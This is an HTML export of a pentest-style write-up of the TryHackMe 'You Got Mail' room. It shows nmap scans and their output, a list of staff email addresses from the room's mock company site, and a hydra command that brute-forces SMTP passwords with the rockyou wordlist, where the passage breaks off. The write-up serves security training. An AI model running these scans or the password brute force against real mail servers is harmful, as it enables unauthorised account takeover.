@@ -1,0 +1,775 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>You Got Mail | Try Hack Me | Pentest Style Report on a CTF</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: undefined; }
+.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+.select-value-color-transparentGray { background-color: undefined; }
+.select-value-color-translucentGray { background-color: undefined; }
+.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="19706ab9-239d-80f5-8777-d590fd19977c" class="page sans"><header><h1 class="page-title">You Got Mail | Try Hack Me | Pentest Style Report on a CTF</h1><p class="page-description"></p></header><div class="page-body"><h1 id="19706ab9-239d-81b2-a728-d60bad5b9ec7" class="">You Got Mail | Try Hack Me | Pentest Style Report on a CTF</h1><p id="19706ab9-239d-8049-a699-c1fae148fba9" class="">
+</p><p id="19706ab9-239d-8123-83ab-c90636901647" class=""><span style="border-bottom:0.05em solid">Room</span>: <a href="https://tryhackme.com/room/yougotmail?isPin=false">tryhackme.com/room/yougotmail</a></p><p id="19706ab9-239d-81e6-94ea-fd457b415407" class=""><strong><span style="border-bottom:0.05em solid">Objective:</span></strong></p><p id="19706ab9-239d-80c8-9f5e-eeaf019aa360" class="">
+</p><p id="19706ab9-239d-81bc-b47b-f3616df308a7" class="">To perform a security assessment for Brik and test the susceptibility of employees to phishing attacks.</p><p id="19706ab9-239d-80fb-87e5-d28b4e88cf64" class="">
+</p><p id="19706ab9-239d-81f5-97a8-fe4e0e31b0b3" class=""><strong><span style="border-bottom:0.05em solid">Scope:</span></strong></p><p id="19706ab9-239d-81de-98f1-d59b367f6d43" class="">Active assessments on &lt;Machine_IP&gt; 10.10.157.197<br/>Passive reconnaissance on:  <br/><a href="https://brownbrick.co/">brownbrick.co</a></p><p id="19706ab9-239d-819b-9a3e-d21222e3ec5e" class="">
+</p><p id="19706ab9-239d-81a4-8aaa-e6d210408fe7" class=""><strong><span style="border-bottom:0.05em solid">Reconnaisance:</span></strong></p><p id="19706ab9-239d-8110-93ae-ee7ee4ab473e" class="">We start with Nmap scan. (For CTFs I always like to do all port scan first and then do a service version and scripts scan on the open ports.<br/>nmap -p- 10.10.157.197 -vvv<br/>There are a lot of ports open<br/></p><figure id="19706ab9-239d-8194-ac66-e69b53851567" class="image"><a href="https://remnote-user-data.s3.amazonaws.com/wuPc2TZj0ZwVT0-0-u7AD5GvzH_8N_XtmHh48Nasae7kgk-f1QRM9jDgQB_fNNed-IgXA_F7buGELUTHKoOjr1c5kNpWGyIP6THpEB3OiFbKOqZBpgvyTPOhkxgM8rFg.png"><img style="width:700px" src="https://remnote-user-data.s3.amazonaws.com/wuPc2TZj0ZwVT0-0-u7AD5GvzH_8N_XtmHh48Nasae7kgk-f1QRM9jDgQB_fNNed-IgXA_F7buGELUTHKoOjr1c5kNpWGyIP6THpEB3OiFbKOqZBpgvyTPOhkxgM8rFg.png"/></a></figure><p id="19706ab9-239d-808a-a006-d48c0b591c6f" class="">
+</p><p id="19706ab9-239d-8145-82c6-d10dfd567898" class="">Now we enumerate the open ports with sVC for service version enumeration and default nmap scripts.<br/><br/></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-809b-84ed-e94645b1af11" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">nmap -p 25,110,135,139,143,445,587,3389,5985,47001,49664,49665,49666,49667,49668,49669,49671,49672 -sVC 10.10.157.197
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-805f-97a9-e1ffb269f1da" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">nmap -p 25,110,135,139,143,445,587,3389,5985,47001,49664,49665,49666,49667,49668,49669,49671,49672 -sVC 10.10.157.197
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-11 05:38 UTC
+Nmap scan report for ip-10-10-157-197.eu-west-1.compute.internal (10.10.157.197)
+Host is up (0.00043s latency).
+PORT STATE SERVICE VERSION
+25/tcp open smtp hMailServer smtpd
+| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+110/tcp open pop3 hMailServer pop3d
+|_pop3-capabilities: USER TOP UIDL
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+143/tcp open imap hMailServer imapd
+|_imap-capabilities: CHILDREN RIGHTS=texkA0001 NAMESPACE IMAP4rev1 SORT completed CAPABILITY QUOTA OK IDLE IMAP4 ACL
+445/tcp open microsoft-ds?
+587/tcp open smtp hMailServer smtpd
+| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+3389/tcp open ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2025-02-11T05:39:48+00:00; -1s from scanner time.
+| ssl-cert: Subject: commonName=BRICK-MAIL
+| Not valid before: 2025-02-10T05:10:02
+|_Not valid after: 2025-08-12T05:10:02
+| rdp-ntlm-info:
+| Target_Name: BRICK-MAIL
+| NetBIOS_Domain_Name: BRICK-MAIL
+| NetBIOS_Computer_Name: BRICK-MAIL
+| DNS_Domain_Name: BRICK-MAIL
+| DNS_Computer_Name: BRICK-MAIL
+| Product_Version: 10.0.17763
+|_ System_Time: 2025-02-11T05:39:43+00:00
+5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open msrpc Microsoft Windows RPC
+49665/tcp open msrpc Microsoft Windows RPC
+49666/tcp open msrpc Microsoft Windows RPC
+49667/tcp open msrpc Microsoft Windows RPC
+49668/tcp open msrpc Microsoft Windows RPC
+49669/tcp open msrpc Microsoft Windows RPC
+49671/tcp open msrpc Microsoft Windows RPC
+49672/tcp closed unknown
+MAC Address: 02:19:9D:B1:01:83 (Unknown)
+Service Info: Host: BRICK-MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+|_nbstat: NetBIOS name: BRICK-MAIL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02199db10183 (unknown)
+| smb2-time:
+| date: 2025-02-11T05:39:43
+|_ start_date: N/A
+| smb2-security-mode:
+| 311:
+|_ Message signing enabled but not required
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 60.53 seconds
+</code></pre><p id="19706ab9-239d-804a-b29a-c39d05b5997e" class="">
+</p><p id="19706ab9-239d-8112-a992-e95c0d408b45" class="">The target system is running <strong>Windows </strong>&amp; has multiple email-related ports open, including <strong>SMTP (25, 587), POP3 (110), and IMAP (143)</strong>, indicating the presence of an <strong>hMailServer </strong>email service.</p><p id="19706ab9-239d-8013-98fa-d5e4a92f7b81" class="">
+</p><p id="19706ab9-239d-81a6-9381-cbc89aeae5d0" class=""><strong><span style="border-bottom:0.05em solid">BrownBrick:</span></strong></p><p id="19706ab9-239d-81e9-89f2-e63d0a6e99eb" class="">Now lets enumerate the <a href="https://brownbrick.co/">brownbrick.co</a> website to see what we can find.<br/>There is nothing much on the website, but &quot;Our Team&quot; page gives info of potential users &amp; their mail IDs. <br/><a href="https://brownbrick.co/menu.html?isPin=false">brownbrick.co/menu.html</a></p><p id="19706ab9-239d-801d-bd18-dc535194994c" class="">
+</p><figure id="19706ab9-239d-81a4-a88d-c1d7dc1f942d" class="image"><a href="https://remnote-user-data.s3.amazonaws.com/SEnT00bcgMwDBu3PE2LSvkkkPb3kayC0XEjNzmyL6cCzqKZzlX5-ZoIDgSnAa5Qbd3nbO_KYVnElp8PGnUsIdCWbCA35xDQK9rWrptsmoc0Zx3QX4Sly1bM8IwgaoZdg.png"><img style="width:700px" src="https://remnote-user-data.s3.amazonaws.com/SEnT00bcgMwDBu3PE2LSvkkkPb3kayC0XEjNzmyL6cCzqKZzlX5-ZoIDgSnAa5Qbd3nbO_KYVnElp8PGnUsIdCWbCA35xDQK9rWrptsmoc0Zx3QX4Sly1bM8IwgaoZdg.png"/></a></figure><p id="19706ab9-239d-8057-9f76-c2f9695da41d" class="">
+</p><p id="19706ab9-239d-8110-85c2-c93669819071" class="">We make a list of the given email IDs:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-80b9-9c28-c55b61560f22" class="code"><code class="language-Bash">oaurelius@brownbrick.co
+tchikondi@brownbrick.co
+wrohit@brownbrick.co
+pcathrine@brownbrick.co
+lhedvig@brownbrick.co
+fstamatis@brownbrick.co</code></pre><p id="19706ab9-239d-80f4-8391-f316bffc01f5" class=""><br/>We have seen that SMTP has an hMailServer and we now have email IDs that potentially use that service. So lets try to brute force the password for all or any of the above mail IDs.<br/><br/></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-8064-86ec-ca7acd2c90f7" class="code"><code class="language-Bash">hydra -L emails.txt -P /usr/share/wordlists/rockyou.txt 10.10.157.197 smtp</code></pre><p id="19706ab9-239d-8096-9e3d-e6e39a3f37f4" class="">
